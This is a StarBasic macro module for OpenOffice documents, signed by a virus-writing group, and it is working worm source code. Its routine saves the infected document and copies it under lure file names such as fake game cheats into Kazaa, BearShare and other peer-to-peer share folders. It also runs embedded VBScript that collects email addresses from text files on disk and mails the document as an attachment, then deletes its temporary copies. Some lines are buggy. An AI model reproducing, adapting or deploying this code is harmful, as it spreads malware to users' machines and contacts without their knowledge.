<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="testvbs" script:language="StarBasic">REM  *****  BASIC  *****

Sub ooo()
rem Ooo.Wangxun by Necronomikon[D00mRiderz]
Dim mEventProps(1) as new com.sun.star.beans.PropertyValue
mEventProps(0).Name = &quot;EventType&quot;
mEventProps(0).Value = &quot;StarBasic&quot;
mEventProps(1).Name = &quot;Script&quot;
mEventProps(1).Value = &quot;macro://ThisComponent/Standard.wangxun.bla&quot;
end sub 
sub bla
Dim dirz As String
Dim dummy()
Dim iVar As Integer
oMailer = createUnoService( &quot;com.sun.star.system.SimpleSystemMail&quot; )
MailProgramm = omailer.querySimpleMailClient()
oleService = createUnoService(&quot;com.sun.star.bridge.OleObjectFactory&quot;)
WSH=oleService.createInstance(&quot;MSScriptControl.ScriptControl&quot;)

iVar = Int((15 * Rnd) -2)
Select Case iVar
Case 1 To 3
files= &quot;HalfLife2-Episode2_cheats.odt&quot;
Case 4 To 6
files= &quot;Pet Soccer.odt&quot;
Case 7, 8
files= &quot;Fifa2007_cheats.odt&quot;
Case Is &gt; 8 And iVar &lt; 11
files= &quot;Nexuiz Full v2_1 Installation Guide.odt&quot;
Case Else
files= &quot;how to cook humans.odt&quot;
End Select
datei=&quot;c:\temp.odt&quot;
dateiurl=converttourl(datei)
odoc=thisComponent
odoc.storeasurl(dateiurl,dummy())
dirz=Environ (&quot;programfiles&quot;)
If dirz = &quot;&quot; Then dirz=Environ(&quot;programfiles&quot;)
Filecopy &quot;c:\temp.odt&quot; ,&quot;c:\test1.odt&quot;
Filecopy &quot;c:\test1.odt&quot; ,  dirz &amp;&quot;\Kazaa\My Shared Folder\&quot;&amp; files
Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\bearshare\shared\&quot; &amp;files
&apos;Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\eDonkey2000\incoming\&quot; &amp;files&quot;.odt&quot;
Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\kazaa lite\my shared folder\&quot; &amp;files
Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\kmd\my shared folder\&quot;&amp; files 
&apos;Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\grokster\my grokster\&quot; &amp;files&quot;.odt&quot;
&apos;Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\morpheus\my shared folder\&quot; &amp;files&quot;.odt&quot;
&apos;Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\limewire\shared\&quot; &amp;files&quot;.odt&quot;
&apos;Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\AppleJuice\Incoming\&quot; &amp;files&quot;.odt&quot;
&apos;Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\?shar?\&quot; &amp;files&quot;.odt&quot;
&apos;Filecopy &quot;c:\temp.odt&quot; ,  dirz &amp;&quot;\icq\shared files\&quot; &amp;files&quot;.odt&quot;

WSH.Language = &quot;VBScript&quot;
vbs=vbs+&quot;Dim Data_, addr&quot;+Chr(10)
vbs=vbs+&quot;Start_dir = &quot;&quot;.&quot;&quot;&quot;+Chr(10)
vbs=vbs+&quot;set FSO=createobject(&quot;&quot;scripting.filesystemobject&quot;&quot;)&quot;+Chr(10)
vbs=vbs+&quot;Set Dir = FSO.GetFolder(Start_dir)&quot;+Chr(10)
vbs=vbs+&quot;getInfo(Dir)&quot;+Chr(10)
vbs=vbs+&quot;Function getInfo(CurrentDir)&quot;+Chr(10)
vbs=vbs+&quot;on error resume next&quot;+Chr(10)
vbs=vbs+&quot;For Each Item In CurrentDir.Files&quot;+Chr(10)
vbs=vbs+&quot;Data_ = &quot;&quot; : addr = &quot;&quot;&quot;+Chr(10)
vbs=vbs+&quot;If LCase(Right(Cstr(Item.Name), 3)) = &quot;&quot;txt&quot;&quot; Then&quot;+Chr(10)
vbs=vbs+&quot;Set open_ = FSO.OpenTextFile(Item.Name, 1)&quot;+Chr(10)
vbs=vbs+&quot;Do While Not open_.AtEndOfLine&quot;+Chr(10)
vbs=vbs+&quot;Data_ = open_.ReadLine &quot;+Chr(10)
vbs=vbs+&quot;addr = Split(Data_, &quot;&quot; &quot;&quot;)&quot;+Chr(10)
vbs=vbs+&quot;For mail = 0 To UBound(addr)&quot;+Chr(10)
vbs=vbs+&quot;If InStr(addr(mail), &quot;&quot;@&quot;&quot;) then&quot;+Chr(10)
vbs=vbs+&quot;MsgBox Trim(addr(mail))&quot;+Chr(10)
vbs=vbs+&quot;end if&quot;+Chr(10)
vbs=vbs+&quot;next&quot;+Chr(10)
vbs=vbs+&quot;loop&quot;+Chr(10)
vbs=vbs+&quot;End If&quot;+Chr(10)
vbs=vbs+&quot;Next&quot;+Chr(10)
vbs=vbs+&quot;for each Item In CurrentDir.SubFolders&quot;+Chr(10)
vbs=vbs+&quot;getInfo(Item)&quot;+Chr(10)
vbs=vbs+&quot;Next&quot;+Chr(10)
vbs=vbs+&quot;End Function&quot;
WSH.ExecuteStatement(vbs)

newmsg = MailProgramm.createSimpleMailMessage()
newmsg.setRecipient(&quot;addr(mail)&quot;)
newmsg.setSubject( &quot;check this message commin from me...&quot; )
Dim attachs(0)
attachs(0)=&quot;file:///c:/&quot;&amp; files 
newmsg.setAttachement(attachs())
Mailprogramm.sendSimpleMailMessage(newmsg, 0 )
wait 20000
kill &quot;c:\test1.odt&quot;
wait 2000
kill &quot;c:\temp.odt&quot;
oDoc.store()
End Sub

</script:module>